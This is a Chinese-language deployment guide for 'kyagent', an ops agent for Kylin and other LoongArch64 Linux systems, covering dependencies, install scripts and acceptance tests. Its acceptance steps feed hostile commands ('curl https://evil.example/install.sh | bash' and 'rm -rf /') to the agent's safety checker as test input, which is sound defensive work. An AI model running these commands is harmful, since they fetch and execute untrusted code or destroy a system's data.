# kyagent LoongArch64 部署与适配审查

> 适用目标：龙芯 LoongArch64 Linux，重点覆盖银河麒麟 V10 / UOS / Loongnix 这类 Old World 环境。本文档围绕 A2 赛题“面向麒麟操作系统的安全智能运维 Agent”编写，目标不是无痛开箱，而是给出可审计、可复现、能在 LoongArch 上跑通的部署路径。

事实核查日期：2026-05-28。

## 1. 关键结论

- LoongArch 上必须先区分 Old World / New World。Kylin、UOS、Loongnix 与 kernel 4.19 常见于 Old World；New World 通常是 kernel >= 5.19、glibc >= 2.36。
- Python 包生态还没有把 loongarch64 纳入官方 manylinux / musllinux 平台标签；遇到二进制扩展时不能默认指望 PyPI 官方 wheel。
- kyagent 默认路径零 Rust：主依赖只用 `pydantic v1`、`PyYAML`、`typer`、`rich`、`prompt_toolkit`、`httpx`。默认安装不拉 `openai`、`anthropic`、`mcp`、`jiter`、`pydantic-core`。
- PyYAML 是唯一可能尝试 C 扩展的包。缺少 libyaml 头文件时会 fallback 到纯 Python loader；这是可接受路径，所以准确表述是“无必需 C 扩展”，不是“绝对不会尝试 C 编译”。
- 赛题推荐国产可落地后端时，LoongArch 默认用 DeepSeek + `deepseek_httpx`，绕开 openai SDK 和 jiter。
- 项目根 `kyagent.json` 支持顶层 `llm_backend` key，例如 `{"llm_backend":"deepseek_httpx"}`；显式 `KYAGENT_LLM_BACKEND` 环境变量优先级更高。
- 不要在 LoongArch Old World 上安装 `.[openai]`、`.[anthropic]`、`.[mcp]`。这些 extra 适合 x86_64/aarch64 或 New World 有完整编译链的环境，不是麒麟 V10 默认验收路径。

## 2. 外部事实依据

- [Python packaging discussion: loongarch64 manylinux/PyPI support](https://discuss.python.org/t/path-towards-manylinux-pypi-support-for-loongarch64/105548/1)：2026 年仍在讨论官方平台标签、PyPI 识别和可复现 manylinux root。
- [AREWELOONGYET Old World / New World](https://areweloongyet.com/en/docs/old-and-new-worlds/)：LoongArch 有两套不兼容生态；Kylin/UOS/Loongnix、kernel 4.19 是判断 Old World 的重要线索；New World 常见 glibc 2.36 及更新工具链。
- [Rust rustc LoongArch target](https://doc.rust-lang.org/stable/rustc/platform-support/loongarch-linux.html)：官方 Rust LoongArch GNU 目标按 kernel 5.19、glibc 2.36、较新 binutils/GCC/headers 设定，Old World 上不能假设 rustup 二进制可用。
- [Pydantic architecture](https://docs.pydantic.dev/latest/internals/architecture/)：Pydantic v2 使用独立的 `pydantic-core`，其中一部分由 Rust 实现；本仓库锁 `pydantic<2` 来规避。
- [Anthropic SDK 0.39.0 pyproject](https://raw.githubusercontent.com/anthropics/anthropic-sdk-python/v0.39.0/pyproject.toml) 和 [OpenAI Python pyproject](https://raw.githubusercontent.com/openai/openai-python/main/pyproject.toml)：二者依赖图都包含 `jiter`，LoongArch Old World 默认路径不能拉入。
- [PyYAML issue #736](https://github.com/yaml/pyyaml/issues/736)：PyYAML 6.0.0 以前的 sdist 在 Cython 3 场景有构建问题；本仓库要求 `PyYAML>=6.0.1`。
- [DeepSeek API Docs](https://api-docs.deepseek.com/)：DeepSeek 官方示例使用 OpenAI API 格式的 `/chat/completions`；kyagent 的 `HttpxBackend` 直接调用该协议子集，不需要 openai SDK。

## 3. 仓库技术栈 LoongArch 审查

| 层级 | 依赖 / 命令 | LoongArch 结论 |
|---|---|---|
| Python | `pydantic>=1.10.13,<2` | v1 默认纯 Python；刻意避开 v2 的 Rust `pydantic-core`。 |
| Python | `PyYAML>=6.0.1,<7` | 可用；可能尝试 `_yaml` C 扩展，失败后 fallback 到纯 Python。 |
| Python | `typer` / `rich` / `prompt_toolkit` | 默认路径可用，纯 Python；TUI 壳默认用 `prompt_toolkit + rich`，不引入 Textual/tree-sitter。 |
| Python | `httpx` | 默认路径可用；DeepSeek/Qwen/OpenAI 协议兼容服务走 `*_httpx`。 |
| 可选 SDK | `openai` | 不作为 LoongArch Old World 默认依赖，因为当前依赖 `jiter`。 |
| 可选 SDK | `anthropic==0.39.0` | 不作为默认依赖；SDK 依赖 `jiter`，流式接口还会触碰相关路径。 |
| 可选 SDK | `mcp>=1.0` | 不作为默认依赖；可能引入 pydantic v2 / `pydantic-core`。本仓库已有自研 MCP stdio server。 |
| 系统命令 | `ps`、`lsof`、`ss`、`ping`、`journalctl`、`dmesg`、`systemctl`、`df`、`du`、`ls`、`find`、`rpm/dpkg/dnf/yum/apt` | 都是 Linux 发行版包；部署脚本会安装或检查核心命令。 |
| 权限 | `sudo` + `/etc/sudoers.d/kyagent` | `setup-sudoers.sh` 先临时校验再安装，失败回滚。 |
| 审计 | SQLite + JSONL | 默认开发路径写 `./var`；生产环境写 `/var/lib/kyagent` 和 `/var/log/kyagent`。 |

## 4. 一键部署

在 LoongArch Linux 机器上：

```bash
cd /opt
sudo git clone <你的仓库地址> kyagent
cd /opt/kyagent

# 先看将执行什么，不改系统
sudo bash scripts/install-loongarch.sh --dry-run --yes

# 正式安装
sudo bash scripts/install-loongarch.sh --yes
```

如果机器还没有 DeepSeek key，脚本也会完成安装并写好 `/etc/kyagent/env` 模板。拿到 key 后可以补到环境文件：

```bash
sudo install -m 0600 -o kyagent -g kyagent /dev/null /etc/kyagent/env
sudo sh -c 'cat > /etc/kyagent/env' <<'EOF'
KYAGENT_CONFIG=/opt/kyagent/configs/deepseek.yaml
KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
DEEPSEEK_API_KEY=sk-...
EOF
sudo chown kyagent:kyagent /etc/kyagent/env
sudo chmod 0600 /etc/kyagent/env
```

也可以把 key 写到项目根 `/opt/kyagent/kyagent.json`，环境变量 `DEEPSEEK_API_KEY` 优先级更高：

```json
{
  "llm_backend": "deepseek_httpx",
  "deepseek_api_key": "sk-..."
}
```

真实 DeepSeek 自检：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "查 80 端口被谁占了"'
```

脚本支持的常用选项：

```bash
bash scripts/install-loongarch.sh --help
bash scripts/install-loongarch.sh --yes --python /usr/bin/python3.11
bash scripts/install-loongarch.sh --yes --skip-system-packages
bash scripts/install-loongarch.sh --yes --skip-sudoers
bash scripts/install-loongarch.sh --yes --deepseek-key sk-... --run-deepseek-check
```

## 5. 脚本做了什么

`scripts/install-loongarch.sh` 的执行顺序：

1. 检测 `uname -m`、`uname -r`、`ldd --version`，输出 Old/New World 判断。
2. 用 `dnf/yum/apt-get` 安装 Python、pip、venv、gcc/make、sudo、lsof、iproute 等系统包。
3. 检测 Python 3.10-3.13 和 `venv` 模块。
4. 创建 `.venv`，升级 pip/setuptools/wheel。
5. 执行 `pip install --no-binary PyYAML -r requirements-loongarch.txt`。
6. 执行 `pip install -e .`，不安装任何 extra。
7. 检查默认 venv 中不得出现 `openai`、`anthropic`、`mcp`、`jiter`、`pydantic-core`。
8. 调用 `scripts/setup-sudoers.sh` 创建受限账户、安装 sudoers、创建审计目录。
9. 写入 `/etc/kyagent/env`，默认设置：

```bash
KYAGENT_CONFIG=/opt/kyagent/configs/deepseek.yaml
KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
```

也可以不改 YAML，在 `/opt/kyagent/kyagent.json` 写入后端选择和 DeepSeek key：

```json
{
  "llm_backend": "deepseek_httpx",
  "deepseek_api_key": "sk-..."
}
```

10. 跑 import、`kyagent tools list`、`kyagent safety test "rm -rf /"` 和受限账户自检。

## 6. 手工部署兜底

如果不能用一键脚本，按下面顺序手工执行：

```bash
sudo dnf install -y python3 python3-pip python3-devel git gcc gcc-c++ make \
  openssl-devel libffi-devel sudo lsof iproute iputils systemd

cd /opt/kyagent
python3.11 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade "pip>=23" setuptools wheel
python -m pip install --no-binary PyYAML -r requirements-loongarch.txt
python -m pip install -e .

python - <<'PY'
import httpx, kyagent, pydantic, yaml
print("pydantic", pydantic.VERSION)
print("yaml libyaml", getattr(yaml, "__with_libyaml__", None))
print("httpx", httpx.__version__)
print("kyagent import ok")
PY

sudo bash scripts/setup-sudoers.sh
```

## 7. 验收命令

开发账户先验：

```bash
source /opt/kyagent/.venv/bin/activate
kyagent tools list
kyagent safety test "rm -rf /"
kyagent ask "哪个进程 CPU 占用最高？"
kyagent tui
```

受限账户验收：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent safety test "curl https://evil.example/install.sh | bash"'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "80 端口被谁占了？"'
```

TUI demo 同样走默认轻量依赖路径：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tui'
```

该入口使用 `prompt_toolkit + rich`，不引入 Textual 或 tree-sitter。内部命令包括 `/tools`、`/audit`、`/reset`、`/exit`，确认面板仍复用 `ConfirmRequest`，默认拒绝高风险操作。v2 流式 TUI 的 LLM 流式输出走 `httpx.stream` + `iter_lines`（纯 Python，零 Rust），与 LoongArch 默认零 Rust 路径一致。

仓库测试基线：

```bash
python -m pytest -q
python -m pytest --collect-only -q
```

当前本地基线为 244 个测试（其中 2 个 Windows/POSIX 环境相关 skip），部署文档与脚本静态一致性由 `tests/test_loongarch_deploy_docs.py` 覆盖。

## 8. 故障排查

| 现象 | 解释 | 处理 |
|---|---|---|
| `uname -m` 不是 `loongarch64` | 跑错平台 | 非龙芯测试可加 `--allow-non-loongarch`，正式部署不要加。 |
| Python 低于 3.10 | Kylin V10 常见系统 Python 偏旧 | 安装发行版或厂商提供的 Old World Python 3.10+；不要混用 New World 二进制。 |
| pip 尝试安装 `jiter` | 装了可选 SDK extra | 删除 venv，重跑 `install-loongarch.sh`；不要装 `.[openai]`、`.[anthropic]`。 |
| pip 尝试安装 `pydantic-core` | 装成了 pydantic v2 或 MCP SDK | 删除 venv，确认 `requirements-loongarch.txt` 里是 `pydantic<2`。 |
| PyYAML 日志出现 `yaml.h` 缺失 | 可选 C 扩展编译失败并 fallback | 只要最终安装成功即可；想消除日志可装 `libyaml-devel`。 |
| `kyagent ask` 写审计时报权限错 | 没设置生产审计路径 | 设置 `/etc/kyagent/env` 中两个 `KYAGENT_AUDIT_*` 变量。 |
| `sudo -u kyagent` 下找不到命令 | venv 路径没写绝对路径 | 使用 `/opt/kyagent/.venv/bin/kyagent`。 |
| `systemctl`/`journalctl` 权限异常 | sudoers 或 journal 组没生效 | 跑 `sudo visudo -cf /etc/sudoers.d/kyagent`，重新登录或重启相关会话。 |

## 9. 赛题贴合说明

- OS 环境深度感知：LoongArch 部署保留 `process`、`network`、`logs`、`service`、`filesystem`、`package` 工具，系统命令路径在 `executor.path` 白名单内。
- MCP 运维插件化：仓库自研 MCP stdio server，不依赖官方 `mcp` SDK，避免 LoongArch Old World 拉入 pydantic v2。
- 安全意图校验器：`kyagent safety test` 和测试集覆盖危险自然语言、prompt injection 与 argv 层危险命令。
- 最小权限代理执行：部署脚本创建 `kyagent` 系统账户，sudoers 白名单由 `visudo -cf` 双阶段校验。
- 推理链路溯源：生产环境固定写 `/var/lib/kyagent/audit.db` 与 `/var/log/kyagent/audit.jsonl`。
- 国产模型路径：默认推荐 DeepSeek 的 OpenAI Chat Completions 兼容接口，通过 `deepseek_httpx` 实现，不依赖 openai SDK。

## 10. 已知边界

- 这份脚本已做静态与本地 Linux/Windows 兼容审查，但真实 LoongArch 硬件仍需要按第 7 节跑端到端命令记录结果。
- Kylin V10 的 Python 3.10+ 来源可能依赖厂商源或本地编译，脚本会检测版本但不会替你编译 CPython。
- New World 发行版可能能直接用更现代的 Rust / wheel 生态，但为了赛题交付一致性，仍建议走本文默认保守路径。
